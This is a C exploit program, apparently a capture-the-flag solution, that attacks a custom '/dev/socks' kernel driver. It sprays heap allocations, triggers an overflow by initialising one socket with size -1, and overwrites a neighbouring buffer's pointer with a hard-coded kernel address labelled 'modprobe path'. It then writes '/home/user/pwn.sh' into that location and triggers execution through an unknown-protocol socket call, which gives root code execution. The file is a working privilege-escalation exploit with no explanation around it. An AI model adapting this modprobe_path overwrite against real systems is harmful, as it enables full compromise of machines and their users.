#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include "socks.h"

typedef struct sock_buf {
	size_t size;
	unsigned char *buffer;
	size_t read_index;
	size_t write_index;
	// Inline buffer!
} sock_buf_t;


int sock_init(int fd, size_t size) {
	return ioctl(fd, IOCTL_SOCKS_INIT, size);
}

int sock_listen(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to listen in %s\n", param.name);

	return ioctl(fd, IOCTL_SOCKS_LISTEN, &param);
}

int sock_connect(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to connect to %s\n", param.name);
	return ioctl(fd, IOCTL_SOCKS_CONNECT, &param);
}

int sock_send(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_SEND, &param);
}

int sock_recv(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_RECV, &param);
}


int main(int argc, char const *argv[])
{

	for(int i=0; i < 0x400 - 0x10; i++) {
		// Open a bunch of size 0 (alloc size should be 0x20)
		int fd = open("/dev/socks", O_RDONLY);
		sock_init(fd, 0x0);
	}
	/* Let's have two socks */

	int fd1 = open("/dev/socks", O_RDONLY);
	int fd2 = open("/dev/socks", O_RDONLY);
	

	sock_init(fd1, -1);
	sock_listen(fd1, "test_socket");
	sock_init(fd2, 0x00);
	sock_connect(fd2, "test_socket");

	char buf1[0x40] = {0};
	char buf2[0x40] = {0};

	/* Send to fd1 => corrupt buffer size and pointer of fd2 */
	
	sock_buf_t buf;
	buf.size = 0x100;
	buf.buffer = 0xffffffff82023ae0L; // modprobe path
	buf.read_index = 0x00;
	buf.write_index = 0x00;
	sock_send(fd2, &buf, sizeof(buf));

	/* NOW THIS PERFORMS ARBITRARY WRITE */
	char pwn[] = "/home/user/pwn.sh";
	sock_send(fd1, pwn, sizeof(pwn));


	/* Trigger launch of pwn.sh */
	socket(AF_INET,SOCK_STREAM,132);

	return 0;
}
